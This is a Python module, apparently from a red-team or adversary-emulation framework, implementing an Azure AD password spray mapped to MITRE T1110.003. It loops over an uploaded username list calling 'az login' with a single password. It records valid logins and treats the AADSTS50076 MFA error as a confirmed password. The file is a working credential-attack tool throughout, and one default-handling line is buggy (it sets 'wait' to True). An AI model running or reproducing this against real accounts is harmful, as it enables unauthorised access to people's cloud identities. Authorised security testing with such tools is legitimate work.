from ..base_technique import BaseTechnique, ExecutionStatus, MitreTechnique
from ..technique_registry import TechniqueRegistry
from typing import Dict, Any, Tuple
from core.azure.azure_access import AzureAccess
import subprocess
import json
import base64
import time

@TechniqueRegistry.register
class AzurePasswordSpray(BaseTechnique):
    def __init__(self):
        mitre_techniques = [
            MitreTechnique(
                technique_id="T1110.003",
                technique_name="Brute Force",
                tactics=["Credential Access", "Initial Access"],
                sub_technique_name="Password Spraying"
            )
        ]
        super().__init__("Password Spray", "Executes password spray attack using a list of usernames", mitre_techniques)

    def execute(self, **kwargs: Any) -> Tuple[ExecutionStatus, Dict[str, Any]]:
        self.validate_parameters(kwargs)
        try:
            # Input validation
            username_file: str = kwargs['username_file']
            password: str = kwargs['password']
            wait: int = kwargs.get('wait', 3) # set default wait to 3 seconds
            stop_at_first_match: bool = kwargs.get('stop_at_first_match', True)
            
            # Input validation
            if password in [None, ""] or username_file in [None, ""]:
                return ExecutionStatus.FAILURE, {
                    "error": {"Error" : "Invalid Technique Input"},
                    "message": {"Error" : "Invalid Technique Input"}
                }
            
            if wait in [None, ""]:
                wait = 3 # set default wait time

            if stop_at_first_match in [None, ""]:
                wait = True # set default wait time
            
            # Get az full execution path
            az_command = AzureAccess().az_command

            # Extract usernames from username text file
            content_string = username_file.split(',')[-1]
            decoded = base64.b64decode(content_string)
            try:
                text = decoded.decode('utf-8')
                user_list = text.split('\n')
                # Remove duplicate usernames
                user_list = list(set(user_list))
            except Exception as e:
                # File decoding failed
                return ExecutionStatus.FAILURE, {
                    "error": str(e),
                    "message": "Failed to decode users file"
                }

            # Initialize variable to store password spray results
            spray_results = {}

            # Start password spray
            for user_name in user_list:
                # Attempt authentication
                try:
                    if user_name in [None, ""]:
                        continue

                    raw_response = subprocess.run([az_command, "login", "-u", user_name, "-p", password], capture_output=True)
                    
                    output = raw_response.stdout
                    out_error = raw_response.stderr
                    
                    # Checking for failed authentication
                    if raw_response.returncode == 0:
                        # If auth successful
                        struc_output = json.loads(output.decode('utf-8'))
                        spray_results[user_name] = {"Success" : struc_output}

                        # Return if set to stop at first match
                        if stop_at_first_match:
                            return ExecutionStatus.SUCCESS, {
                                "message": f"Successfully matched username",
                                "value": spray_results
                            }
                    else:
                        # If auth failed
                        struc_error = out_error.decode('utf-8')
                        if "AADSTS50076" in struc_error:
                            spray_results[user_name] = {"Success" : "Password matched with username. Authentication failed - Account has MFA."}
                            if stop_at_first_match:
                                return ExecutionStatus.SUCCESS, {
                                    "message": f"Successfully matched username",
                                    "value": spray_results
                                }
                        else:
                            spray_results[user_name] = {"Failed" : struc_error}
                            raise Exception("Auth failed")
                except:
                    # Wait before attempting next username
                    time.sleep(wait)
            
            # Return password spray result
            return ExecutionStatus.SUCCESS, {
                "message": f"Successfully completed password spray. No username matched",
                "value": spray_results
            }
        except Exception as e:
            return ExecutionStatus.FAILURE, {
                "error": str(e),
                "message": "Failed to execute password spray"
            }

    def get_parameters(self) -> Dict[str, Dict[str, Any]]:
        return {
            "username_file": {"type": "str", "required": True, "default": None, "name": "Username File", "input_field_type" : "upload"},
            "password": {"type": "str", "required": True, "default": None, "name": "Password", "input_field_type" : "password"},
            "wait": {"type": "int", "required": False, "default": 3, "name": "Wait (in sec)", "input_field_type" : "number"},
            "stop_at_first_match": {"type": "bool", "required": False, "default": True, "name": "Stop at First Match", "input_field_type" : "bool"}
        }